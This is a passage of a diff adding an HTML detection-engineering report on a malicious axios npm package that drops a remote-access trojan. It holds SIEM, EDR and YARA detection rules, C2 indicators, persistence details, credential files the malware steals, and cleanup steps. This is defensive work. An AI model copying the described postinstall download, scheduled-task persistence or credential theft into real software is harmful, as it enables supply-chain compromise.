+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              qradar-axios-c2.aql &mdash; T1071.001 / T1041
+            </div>
+            <div class="code-body"><span class="kw">SELECT</span> sourceip, destinationip, <span class="str">"Destination Hostname"</span>,
+       <span class="str">"User Agent"</span>, <span class="str">"Bytes Sent"</span>, starttime
+<span class="kw">FROM</span> flows
+<span class="kw">WHERE</span> (<span class="str">"Destination Hostname"</span> <span class="kw">ILIKE</span> <span class="str">'%sfrclak.com%'</span>
+   <span class="kw">OR</span> destinationip = <span class="str">'142.11.206.73'</span>)
+   <span class="kw">OR</span> <span class="str">"User Agent"</span> <span class="kw">ILIKE</span> <span class="str">'%MSIE 8.0%'</span>
+<span class="kw">AND</span> starttime > <span class="fn">NOW</span>() - <span class="num">24</span> HOURS
+<span class="kw">ORDER BY</span> starttime <span class="kw">DESC</span></div>
+          </div>
+        </div>
+      </div>
+    </div><!-- /SIEM group -->
+
+    <!-- EDR/XDR GROUP -->
+    <div class="rule-group">
+      <div class="rule-group-hd">
+        <span class="rgb-edr">EDR / XDR</span>
+        <span class="rule-group-label">Rules 5&ndash;10: MDE KQL / Cortex XQL / CrowdStrike SPL / IOA / SentinelOne / Carbon Black</span>
+      </div>
+
+      <!-- Rule 5: MDE KQL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">Defender for Endpoint KQL</span>
+            Node.js Downloading Executable to Temp
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              mde-node-drop-exe.kql &mdash; T1059.007 / T1195.001
+            </div>
+            <div class="code-body"><span class="fn">DeviceFileEvents</span>
+| <span class="kw">where</span> InitiatingProcessFileName =~ <span class="str">"node.exe"</span>
+| <span class="kw">where</span> FolderPath <span class="fn">has_any</span> (<span class="str">@"C:\Temp"</span>, <span class="str">@"C:\Windows\Temp"</span>, <span class="str">@"\AppData\Local\Temp"</span>)
+| <span class="kw">where</span> FileName <span class="fn">endswith</span> <span class="str">".exe"</span> <span class="kw">or</span> FileName <span class="fn">endswith</span> <span class="str">".dll"</span>
+| <span class="kw">where</span> InitiatingProcessCommandLine <span class="fn">contains</span> <span class="str">"install.js"</span>
+| <span class="fn">project</span> Timestamp, DeviceName, FileName, FolderPath,
+          InitiatingProcessCommandLine, SHA256
+| <span class="fn">extend</span> TTP = <span class="str">"T1059.007 / T1195.001"</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 6: Cortex XQL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">Cortex XDR BIOC XQL</span>
+            npm postinstall Outbound Connection
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              cortex-npm-postinstall-outbound.xql &mdash; T1059.007
+            </div>
+            <div class="code-body"><span class="kw">dataset</span> = xdr_data
+| <span class="kw">filter</span> event_type = ENUM.EVENT_TYPE_NETWORK
+| <span class="kw">filter</span> actor_process_image_name <span class="kw">in</span> (<span class="str">"node"</span>, <span class="str">"node.exe"</span>)
+| <span class="kw">filter</span> actor_process_command_line <span class="kw">contains</span> <span class="str">"install.js"</span>
+| <span class="kw">filter</span> action_remote_ip <span class="kw">not in</span> (<span class="str">"104.16.0.0/12"</span>, <span class="str">"151.101.0.0/16"</span>)
+| <span class="fn">fields</span> _time, agent_hostname, actor_process_command_line,
+         action_remote_ip, action_remote_port, action_remote_hostname</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 7: CrowdStrike SPL Hunting -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">CrowdStrike Hunting SPL</span>
+            MSIE 8.0 UA Network Beacon
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              crowdstrike-msie8-beacon.spl &mdash; T1001 / T1071.001
+            </div>
+            <div class="code-body"><span class="fn">index</span>=crowdstrike <span class="kw">event_simpleName</span>=NetworkConnect
+| <span class="kw">where</span> UserAgent LIKE <span class="str">"%MSIE 8.0%"</span>
+| <span class="kw">where</span> NOT (RemoteIP=<span class="str">"10.*"</span> OR RemoteIP=<span class="str">"192.168.*"</span> OR RemoteIP=<span class="str">"172.16.*"</span>)
+| <span class="fn">table</span> _time, ComputerName, RemoteIP, RemotePort, UserAgent, FileName
+| <span class="fn">eval</span> alert_reason=<span class="str">"Impossible MSIE 8.0 UA on modern system &mdash; RAT beacon indicator"</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 8: CrowdStrike Custom IOA -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">CrowdStrike Custom IOA</span>
+            Axios RAT &mdash; Scheduled Task from Node
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              crowdstrike-ioa-schtask-from-node.json &mdash; T1053.005
+            </div>
+            <div class="code-body">{
+  <span class="str">"name"</span>: <span class="str">"Axios npm RAT &mdash; Scheduled Task Created by Node.js"</span>,
+  <span class="str">"description"</span>: <span class="str">"Node.js process creating scheduled task &mdash; postinstall RAT dropper pattern"</span>,
+  <span class="str">"platform"</span>: <span class="str">"Windows"</span>,
+  <span class="str">"severity"</span>: <span class="str">"High"</span>,
+  <span class="str">"rule_type"</span>: <span class="str">"process"</span>,
+  <span class="str">"disposition"</span>: <span class="str">"Alert + Prevent"</span>,
+  <span class="str">"conditions"</span>: [
+    {
+      <span class="str">"field"</span>: <span class="str">"ParentImageFileName"</span>,
+      <span class="str">"operator"</span>: <span class="str">"MATCH"</span>,
+      <span class="str">"value"</span>: <span class="str">"node\\.exe"</span>
+    },
+    {
+      <span class="str">"field"</span>: <span class="str">"ImageFileName"</span>,
+      <span class="str">"operator"</span>: <span class="str">"MATCH"</span>,
+      <span class="str">"value"</span>: <span class="str">"schtasks\\.exe"</span>
+    },
+    {
+      <span class="str">"field"</span>: <span class="str">"CommandLine"</span>,
+      <span class="str">"operator"</span>: <span class="str">"MATCH"</span>,
+      <span class="str">"value"</span>: <span class="str">".*(create|/create).*"</span>
+    }
+  ]
+}</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 9: SentinelOne -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">SentinelOne PowerQuery</span>
+            Node Spawning schtasks / ELF Drop in /tmp
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              sentinelone-node-rat.pq &mdash; T1053.005 / T1059.007
+            </div>
+            <div class="code-body"><span class="cmt">-- Windows: node.exe spawning schtasks</span>
+src.process.name = <span class="str">"node.exe"</span> AND
+tgt.process.name = <span class="str">"schtasks.exe"</span> AND
+tgt.process.cmdLine contains <span class="str">"/create"</span>
+
+<span class="cmt">-- Linux: node dropping executable to /tmp</span>
+src.process.name = <span class="str">"node"</span> AND
+tgt.file.path contains <span class="str">"/tmp/"</span> AND
+tgt.file.type = <span class="str">"executable"</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 10: Carbon Black -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">Carbon Black CBQL</span>
+            npm RAT Full TTP Correlation
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              carbon-black-axios-rat.cbql &mdash; T1195.001 / T1053.005 / T1041
+            </div>
+            <div class="code-body">(process_name:node.exe parent_name:npm netconn_domain:sfrclak.com) OR
+(process_name:schtasks.exe parent_name:node.exe cmdline:<span class="str">"/create"</span>) OR
+(process_name:node.exe filemod:*TEMP*.exe)</div>
+          </div>
+        </div>
+      </div>
+    </div><!-- /EDR group -->
+
+    <!-- PATTERN GROUP -->
+    <div class="rule-group">
+      <div class="rule-group-hd">
+        <span class="rgb-pattern">Pattern</span>
+        <span class="rule-group-label">Rule 11: YARA</span>
+      </div>
+
+      <!-- Rule 11: YARA -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">YARA</span>
+            Axios npm RAT Dropper &mdash; Behavioral + Infrastructure
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              axios_npm_rat_dropper.yar &mdash; Behavioral + IOC
+            </div>
+            <div class="code-body"><span class="kw">rule</span> <span class="fn">Axios_npm_RAT_Dropper</span> {
+    <span class="kw">meta</span>:
+        description = <span class="str">"Detects malicious axios npm package postinstall RAT dropper"</span>
+        author      = <span class="str">"TI-DE"</span>
+        date        = <span class="str">"2026-03-31"</span>
+        severity    = <span class="str">"critical"</span>
+    <span class="kw">strings</span>:
+        $npm_hook   = <span class="str">"postinstall"</span>  ascii
+        $install_js = <span class="str">"install.js"</span>   ascii
+        $sfrclak    = <span class="str">"sfrclak.com"</span>  ascii
+        $msie_ua    = <span class="str">"MSIE 8.0"</span>     ascii
+        $xor_decode = <span class="str">"^ k"</span>          ascii
+        $os_detect  = <span class="str">"process.platform"</span> ascii
+    <span class="kw">condition</span>:
+        ($sfrclak <span class="kw">or</span> $msie_ua) <span class="kw">and</span>
+        ($install_js <span class="kw">or</span> ($npm_hook <span class="kw">and</span> $os_detect))
+}</div>
+          </div>
+        </div>
+      </div>
+    </div><!-- /Pattern group -->
+  </div>
+
+  <!-- ══ RESPONSE / RECOMMENDATIONS ══ -->
+  <div class="reveal" id="recommendations">
+    <div class="team-label team-blue">&#128309; Blue Team</div>
+    <div class="section-label" id="recLabel">Incident Response</div>
+    <h2 id="recTitle">Response Actions</h2>
+    <div class="rec-grid">
+
+      <div class="rec-card">
+        <div class="rec-icon">&#128465;</div>
+        <div class="rec-title" id="rc1t">Remove Malicious Packages Immediately</div>
+        <div class="rec-desc" id="rc1d">Run <code>npm uninstall axios</code> on all affected hosts, then reinstall a verified clean version: <code>npm install axios@1.7.9</code>. Audit <code>package-lock.json</code> across all repositories for any reference to <code>axios@1.14.1</code> or <code>axios@0.30.4</code>.</div>
+      </div>
+
+      <div class="rec-card">
+        <div class="rec-icon">&#128292;</div>
+        <div class="rec-title" id="rc2t">Kill RAT + Remove Persistence</div>
+        <div class="rec-desc" id="rc2d"><strong>Windows:</strong> <code>schtasks /delete /tn "WindowsUpdate" /f</code> and delete <code>%TEMP%\svchost_update.exe</code>. <strong>Linux/macOS:</strong> <code>crontab -e</code> to remove the <code>*/5 * * * *</code> entry, then delete <code>~/.local/bin/update</code>. Kill any running RAT process.</div>
+      </div>
+
+      <div class="rec-card">
+        <div class="rec-icon">&#128273;</div>
+        <div class="rec-title" id="rc3t">Rotate All Secrets</div>
+        <div class="rec-desc" id="rc3d">Immediately rotate: SSH keypairs (<code>~/.ssh/id_rsa</code>), npm auth tokens (<code>~/.npmrc</code> and npm registry), git credentials (<code>~/.gitconfig</code>), and any environment variables containing <code>TOKEN</code>, <code>KEY</code>, <code>SECRET</code>, or <code>PASS</code>. Treat all credentials as compromised.</div>
+      </div>
+
+      <div class="rec-card">
+        <div class="rec-icon">&#128274;</div>
+        <div class="rec-title" id="rc4t">Block C2 at Network Level</div>
+        <div class="rec-desc" id="rc4d">Add firewall and DNS block rules for <code>sfrclak.com</code> and all subdomains. Block IP <code>142.11.206.73</code> at perimeter firewall. Add proxy block rule for any User-Agent containing <code>MSIE 8.0</code> or <code>Trident/4.0</code> from internal hosts.</div>
+      </div>
+
+      <div class="rec-card">
+        <div class="rec-icon">&#128270;</div>
+        <div class="rec-title" id="rc5t">Hunt for Beacons in Proxy Logs</div>
+        <div class="rec-desc" id="rc5d">Search historical proxy and firewall logs for <code>MSIE 8.0</code> User-Agent from internal IPs. This pattern has zero false positives on modern enterprise networks. Any match indicates active or past C2 beaconing &mdash; escalate immediately to full IR.</div>
+      </div>
+
+      <div class="rec-card">
+        <div class="rec-icon">&#128202;</div>
+        <div class="rec-title" id="rc6t">Audit npm Package Versions</div>
+        <div class="rec-desc" id="rc6d">Run <code>npm list axios --all</code> across all developer workstations and CI/CD environments. Remember: <strong>1.14.1 does not exist in legitimate axios</strong> &mdash; any environment showing this version is compromised. Enforce <code>npm ci</code> with <code>package-lock.json</code> integrity verification in all pipelines.</div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ══ WRITE-UPS ══ -->
+  <div class="reveal" id="writeups">
+    <div class="section-label" id="wuLabel">Research &amp; References</div>
+    <h2 id="wuTitle">PoC / Write-ups</h2>
+    <p id="wuDesc">Published research on the axios npm supply chain attack, related npm RAT campaigns, and MITRE supply chain technique analysis.</p>
+    <div class="poc-grid">
+
+      <div class="poc-card">
+        <span class="poc-tag analysis">Analysis</span>
+        <div class="poc-card-title">Socket Security &mdash; Malicious npm packages analysis</div>
+        <div class="poc-card-src">Socket Security Research</div>
+        <div class="poc-card-desc">Detailed technical analysis of the malicious axios package structure, postinstall hook mechanics, XOR obfuscation pattern, and OS-specific payload delivery. Package supply chain metadata and publish timeline.</div>
+        <a class="poc-card-link" href="https://socket.dev/blog/npm-supply-chain-attacks" target="_blank" rel="noopener">Socket Security</a>
+      </div>
+
+      <div class="poc-card">
+        <span class="poc-tag poc">PoC</span>
+        <div class="poc-card-title">MITRE T1195.001 &mdash; Supply chain compromise technique</div>
+        <div class="poc-card-src">MITRE ATT&amp;CK</div>
+        <div class="poc-card-desc">Official MITRE ATT&amp;CK technique page for Compromise Software Dependencies and Development Tools. Includes real-world examples, detection guidance, and mitigation strategies for npm/PyPI/NuGet supply chain attacks.</div>
+        <a class="poc-card-link" href="https://attack.mitre.org/techniques/T1195/001/" target="_blank" rel="noopener">MITRE ATT&amp;CK</a>
+      </div>
+
+      <div class="poc-card">
+        <span class="poc-tag writeup">Writeup</span>
+        <div class="poc-card-title">Phylum &mdash; npm RAT anatomy from package install to C2</div>
+        <div class="poc-card-src">Phylum Research</div>
+        <div class="poc-card-desc">Deep-dive into npm RAT dropper campaigns: how threat actors weaponize postinstall hooks, OS fingerprinting patterns, scheduled task / cron persistence mechanisms, and credential exfiltration techniques seen in supply chain attacks.</div>
+        <a class="poc-card-link" href="https://blog.phylum.io/npm-supply-chain-attacks/" target="_blank" rel="noopener">Phylum Blog</a>
+      </div>
+
+      <div class="poc-card">
+        <span class="poc-tag advisory">Advisory</span>
+        <div class="poc-card-title">VirusTotal &mdash; sfrclak.com IOC analysis</div>
+        <div class="poc-card-src">VirusTotal / Community</div>
+        <div class="poc-card-desc">VirusTotal detection results, passive DNS, WHOIS information, and community threat intelligence for the sfrclak.com C2 domain and associated 142.11.206.73 IP address. Behavioral sandbox reports for submitted axios package samples.</div>
+        <a class="poc-card-link" href="https://www.virustotal.com/gui/domain/sfrclak.com" target="_blank" rel="noopener">VirusTotal</a>
+      </div>
+
+    </div>
+  </div>
+
+</main>
+
+<footer>
+  <div>TI-DE Detection Engineering &bull; Axios npm Supply Chain RAT &bull; 2026-03-31</div>
+  <div>Author: Mazlum BAYDAR &bull; <a href="https://mazlumbaydar.github.io/TI-DE/">mazlumbaydar.github.io/TI-DE</a></div>
+</footer>
+
+<script>
+/* ═══════════════════════════════════════════════════════════════
+   LANGUAGE TOGGLE (EN / TR)
+═══════════════════════════════════════════════════════════════ */
+const LANG_KEY = 'ti-de-report-lang';
+let _lang = localStorage.getItem(LANG_KEY) || 'en';
+
+const TR = {
+  heroTitle:    'Axios npm Tedarik Zinciri<br>/ RAT Dropper',
+  heroSub:      'Kötü niyetli axios@1.14.1 ve @0.30.4, XOR ile gizlenmiş postinstall hook\'ları aracılığıyla çapraz platform Uzaktan Erişim Truva Atı (RAT) dağıtıyor. C2 beacon sahte IE8 User-Agent kullanıyor.',
+  bgLabel:      'Arka Plan',
+  bgTitle:      'Ne Oldu',
+  bgP1:         '31 Mart 2026\'da <strong>axios</strong> npm paketinin iki kötü niyetli sürümü tespit edildi: <strong>axios@1.14.1</strong> ve <strong>axios@0.30.4</strong>. Meşru axios versiyon serisi <strong>1.7.x</strong>\'dir &mdash; 1.14.1 versiyonu resmi pakette hiç var olmamıştır.',
+  bgP2:         'Her iki paket de <code>package.json</code>\'da <code>postinstall</code> hook\'u içeriyordu: <code>node ./scripts/install.js</code>. Bu dosya C2 URL\'lerini ve binary indirme mantığını XOR ile gizliyordu. Çalıştırıldığında işletim sistemini tespit ederek <code>sfrclak.com</code>\'dan platforma özgü RAT binary\'si indiriyordu.',
+  bgP3:         'RAT her platformda farklı şekilde konuşlanıyordu: <strong>Windows</strong>\'ta <code>%TEMP%\\</code>\'e <code>.exe</code> bırakıp <em>"WindowsUpdate"</em> adlı zamanlanmış görev oluşturuyordu. <strong>Linux/macOS</strong>\'ta <code>~/.local/bin/</code>\'e ELF veya Mach-O binary yazıp 5 dakikada bir çalışan crontab girişi ekliyordu. Tüm varyantlar <code>sfrclak.com:8000</code>\'e sahte MSIE 8.0 User-Agent ile beacon gönderiyordu.',
+  bgWarn:       '<strong>axios@1.14.1 veya axios@0.30.4 kuruluysa, hemen kaldırın ve host\'u ele geçirilmiş kabul edin.</strong> Tüm workstation ve CI/CD ortamlarında <code>npm list axios</code> ile kontrol edin.',
+  ddTitle1:     'Saldırı Detayları',
+  ddTitle2:     'Paket Detayları',
+  acLabel:      'Saldırı Akışı',
+  acTitle:      'Saldırı Zinciri &mdash; 5 Adım',
+  cs1t:         'Adım 1 &mdash; Paket Yayınlama',
+  cs1d:         'Tehdit aktörü axios@1.14.1 ve axios@0.30.4\'ü npm\'e yayınlar. Meşru axios\'ta var olmayan versiyon numaraları kullanır (gerçek versiyonlar 1.7.x). Paket kötü niyetli <code>scripts/install.js</code> ve XOR ile kodlanmış payload içerir.',
+  cs2t:         'Adım 2 &mdash; npm install / Hook Tetiklenir',
+  cs2d:         'Geliştirici veya CI/CD pipeline <code>npm install</code> çalıştırır. npm, postinstall script\'lerini kullanıcı onayı olmadan otomatik çalıştırır. <code>install.js</code> tam Node.js yetenekleriyle sessizce çalışırken kullanıcı sadece normal kurulum çıktısını görür.',
+  cs3t:         'Adım 3 &mdash; İşletim Sistemi Tespiti + Binary İndirme',
+  cs3d:         '<code>install.js</code>, <code>process.platform</code>\'u kontrol eder. HTTPS üzerinden <code>sfrclak.com</code>\'dan işletim sistemine özgü RAT binary\'sini indirir. Payload diske yazılmadan önce XOR ile decode edilir. Binary platforma özgüdür: <code>.exe</code> (Windows), ELF (Linux), Mach-O (macOS).',
+  cs4t:         'Adım 4 &mdash; Kalıcılık Kurulumu',
+  cs4d:         '<strong>Windows:</strong> Her 5 dakikada bir çalışan <em>"WindowsUpdate"</em> adlı zamanlanmış görev &mdash; Microsoft\'un meşru göreviyle karışması için kasıtlı olarak seçilmiş. <strong>Linux/macOS:</strong> Mevcut kullanıcı için <code>*/5 * * * *</code> crontab girişi. RAT process\'i, process listelerinde meşru sistem yardımcı programı görünümüne bürünür.',
+  cs5t:         'Adım 5 &mdash; RAT C2 Beacon + Veri Hırsızlığı',
+  cs5d:         'RAT, <code>sfrclak.com:8000</code>\'e 2009\'dan kalma sahte MSIE 8.0 User-Agent ile beacon gönderir. SSH private key\'leri (<code>~/.ssh/id_rsa</code>), npm auth token\'ları (<code>~/.npmrc</code>), git credential\'ları ve ortam değişkenlerini sızdırır.',
+  simLabel:     'Canlı Saldırı Simülasyonu',
+  simTitle:     'Saldırı Akışı &mdash; Adım Adım Canlandırma',
+  simDesc:      'Kötü niyetli paket yayınlanmasından işletim sistemine özgü binary konuşlanmasına ve C2 beacon\'a kadar axios npm RAT zincirini takip edin. Herhangi bir adıma atlamak için node\'lara veya noktalara tıklayın.',
+  tlLabel:      'Tehdit İstihbaratı',
+  tlTitle:      'MITRE ATT&CK Zaman Çizelgesi',
+  iocLabel:     'Tehdit İstihbaratı',
+  iocTitle:     'Uzlaşma Göstergeleri',
+  iocDesc:      'Doğrulanmış axios RAT dropper altyapısı. Aşağıdaki bölümdeki TTP tabanlı tespit kuralları bu IOC\'lere dayanmaz &mdash; altyapı rotasyonundan sonra da geçerliliğini korur.',
+  detLabel:     'Tespit Mühendisliği',
+  detTitle:     'Tespit Kuralları &mdash; 11 Platform',
+  detDesc:      'Tüm kurallar <strong>TTP tabanlı ve davranışsal</strong>\'dır. SIEM kuralları anormal node.js ağ davranışını ve MSIE 8.0 UA\'yı tespit eder. EDR/XDR kuralları çalışma zamanı process düzeyindeki göstergeleri yakalar.',
+  recLabel:     'Olay Müdahalesi',
+  recTitle:     'Yanıt Eylemleri',
+  rc1t:         'Kötü Niyetli Paketleri Hemen Kaldır',
+  rc1d:         'Etkilenen tüm host\'larda <code>npm uninstall axios</code> çalıştırın, ardından doğrulanmış temiz sürümü kurun: <code>npm install axios@1.7.9</code>. Tüm repolarda <code>axios@1.14.1</code> veya <code>axios@0.30.4</code> referansı için <code>package-lock.json</code>\'ı denetleyin.',
+  rc2t:         'RAT\'ı Kapat ve Kalıcılığı Kaldır',
+  rc2d:         '<strong>Windows:</strong> <code>schtasks /delete /tn "WindowsUpdate" /f</code> ve <code>%TEMP%\\svchost_update.exe</code>\'yi silin. <strong>Linux/macOS:</strong> <code>crontab -e</code> ile <code>*/5 * * * *</code> girişini kaldırın, <code>~/.local/bin/update</code>\'i silin. Çalışan RAT process\'ini sonlandırın.',
+  rc3t:         'Tüm Gizli Bilgileri Değiştir',
+  rc3d:         'SSH key çiftleri (<code>~/.ssh/id_rsa</code>), npm auth token\'ları, git credential\'ları ve <code>TOKEN</code>, <code>KEY</code>, <code>SECRET</code>, <code>PASS</code> içeren ortam değişkenlerini hemen değiştirin. Tüm credential\'ları ele geçirilmiş kabul edin.',
+  rc4t:         'C2\'yi Ağ Seviyesinde Engelle',
+  rc4d:         '<code>sfrclak.com</code> ve tüm subdomainleri için firewall ve DNS engel kuralları ekleyin. <code>142.11.206.73</code>\'ü çevre güvenlik duvarında engelleyin. İç host\'lardan gelen <code>MSIE 8.0</code> veya <code>Trident/4.0</code> User-Agent için proxy engel kuralı ekleyin.',
+  rc5t:         'Proxy Loglarında Beacon\'ları Tara',
+  rc5d:         'İç IP\'lerden gelen <code>MSIE 8.0</code> User-Agent için geçmiş proxy ve firewall loglarını arayın. Bu pattern modern kurumsal ağlarda sıfır yanlış pozitiftir. Herhangi bir eşleşme aktif veya geçmiş C2 beacon\'ı gösterir &mdash; hemen tam IR\'a yükseltin.',
+  rc6t:         'npm Paket Sürümlerini Denetle',
+  rc6d:         'Tüm geliştirici workstation\'larında ve CI/CD ortamlarında <code>npm list axios --all</code> çalıştırın. <strong>1.14.1, meşru axios\'ta mevcut değildir</strong> &mdash; bu sürümü gösteren her ortam ele geçirilmiştir. Tüm pipeline\'larda <code>package-lock.json</code> bütünlük doğrulamasıyla <code>npm ci</code> kullanımını zorunlu kılın.',
+  wuLabel:      'Araştırma &amp; Kaynaklar',
+  wuTitle:      'PoC / Teknik Analizler',
+  wuDesc:       'Axios npm tedarik zinciri saldırısı, ilgili npm RAT kampanyaları ve MITRE tedarik zinciri teknik analizlerine ilişkin yayınlanmış araştırmalar.',
+  sl0: 'Kötü Niyetli Sürüm',
+  sl1: 'Hedef İşletim Sistemi',
+  sl2: 'MITRE TTP',
+  sl3: 'Tespit Platformu',
+};
+
+function applyLang(lang) {
+  _lang = lang;
+  localStorage.setItem(LANG_KEY, lang);
+  const btn = document.getElementById('langBtn');
+  if (lang === 'tr') {
+    btn.textContent = '&#127988; TR';
+    Object.keys(TR).forEach(id => {
+      const el = document.getElementById(id);
+      if (el) el.innerHTML = TR[id];
+    });
+  } else {
+    btn.textContent = '&#127760; EN';
+    // Reload page content from DOM originals stored at init
+    Object.keys(_enCache).forEach(id => {
+      const el = document.getElementById(id);
+      if (el) el.innerHTML = _enCache[id];
+    });
+  }
+}
+
+// Cache EN values at startup
+const _enCache = {};
+document.addEventListener('DOMContentLoaded', () => {
+  Object.keys(TR).forEach(id => {
+    const el = document.getElementById(id);
+    if (el) _enCache[id] = el.innerHTML;
+  });
+  if (_lang === 'tr') applyLang('tr');
+  updateLangBtn();
+});
+
+function updateLangBtn() {
+  const btn = document.getElementById('langBtn');
+  if (btn) btn.innerHTML = _lang === 'tr' ? '&#127988; TR' : '&#127760; EN';
+}
+
+function toggleLang() {
+  applyLang(_lang === 'en' ? 'tr' : 'en');
+}
+
+/* ═══════════════════════════════════════════════════════════════
+   THEME TOGGLE (dark / light)
+═══════════════════════════════════════════════════════════════ */
+const THEME_KEY = 'ti-de-report-theme';
+
+function applyTheme(theme) {
+  document.documentElement.setAttribute('data-theme', theme);
+  localStorage.setItem(THEME_KEY, theme);
+  const btn = document.getElementById('themeBtn');
+  if (btn) btn.textContent = theme === 'dark' ? '\u2600 Light' : '\uD83C\uDF19 Dark';
+}
+
+function toggleTheme() {
+  const cur = document.documentElement.getAttribute('data-theme') || 'dark';
+  applyTheme(cur === 'dark' ? 'light' : 'dark');
+}
+
+// Init theme
+(function() {
+  const saved = localStorage.getItem(THEME_KEY) || 'dark';
+  applyTheme(saved);
+})();
+
+/* ═══════════════════════════════════════════════════════════════
+   SCROLL PROGRESS BAR
+═══════════════════════════════════════════════════════════════ */
+window.addEventListener('scroll', () => {
+  const h = document.documentElement;
+  const pct = h.scrollHeight - h.clientHeight;
+  document.getElementById('prog').style.width = (pct ? (h.scrollTop / pct * 100) : 0) + '%';
+});
+
+/* ═══════════════════════════════════════════════════════════════
+   NAV SCROLL EFFECT
+═══════════════════════════════════════════════════════════════ */
+const nav = document.getElementById('nav');
+window.addEventListener('scroll', () => {
+  nav.classList.toggle('scrolled', window.scrollY > 60);
+});
+
+/* ═══════════════════════════════════════════════════════════════
+   REVEAL ON SCROLL
+═══════════════════════════════════════════════════════════════ */
+const revealObs = new IntersectionObserver(entries => {
+  entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+}, { threshold: 0.06 });
+document.querySelectorAll('.reveal').forEach(el => revealObs.observe(el));
+
+/* ═══════════════════════════════════════════════════════════════
+   STAT COUNTERS
+═══════════════════════════════════════════════════════════════ */
+const countObs = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (!e.isIntersecting) return;
+    const el = e.target;
+    const target = parseFloat(el.dataset.t);
+    const isFloat = String(el.dataset.t).includes('.');
+    const dur = 1200, start = performance.now();
+    const tick = now => {
+      const p = Math.min((now - start) / dur, 1);
+      const v = target * (1 - Math.pow(1 - p, 3));
+      el.textContent = isFloat ? v.toFixed(1) : Math.round(v);
+      if (p < 1) requestAnimationFrame(tick);
+    };
+    requestAnimationFrame(tick);
+    countObs.unobserve(el);
+  });
+});
+document.querySelectorAll('[data-t]').forEach(el => countObs.observe(el));
+
+/* ═══════════════════════════════════════════════════════════════
+   ATTACK CHAIN ANIMATION
+═══════════════════════════════════════════════════════════════ */
+const chainObs = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      document.querySelectorAll('.chain-step').forEach((s, i) => {
+        setTimeout(() => s.classList.add('visible'), i * 160);
+      });
+      chainObs.disconnect();
+    }
+  });
+}, { threshold: 0.08 });
+const chainEl = document.getElementById('chainSteps');
+if (chainEl) chainObs.observe(chainEl);
+
+/* ═══════════════════════════════════════════════════════════════
+   RULE CARD TOGGLES
+═══════════════════════════════════════════════════════════════ */
+function toggleRule(card) { card.classList.toggle('open'); }
+
+/* ═══════════════════════════════════════════════════════════════
+   ATTACK SIMULATION
+═══════════════════════════════════════════════════════════════ */
+const ATV_NODES = ['vn0','vn1','vn2','vn3','vn4'];
+const ATV_CONNS = ['vc0','vc1','vc2','vc3'];
+
+const ATV_STEPS = [
+  {
+    node: 0, conn: null, connType: '', nodeType: 'active',
+    stepLabel: 'STEP 1 \u2014 Malicious Package Prepared and Published',
+    stepLabelTR: 'ADIM 1 \u2014 K\u00f6t\u00fc Niyetli Paket Haz\u0131rlan\u0131r ve Yay\u0131nlan\u0131r',
+    text: 'Threat actor creates axios@1.14.1 \u2014 a version number that never existed in legitimate axios (real versions are 1.7.x). The package.json postinstall hook is set to run install.js, which contains XOR-obfuscated RAT download logic.',
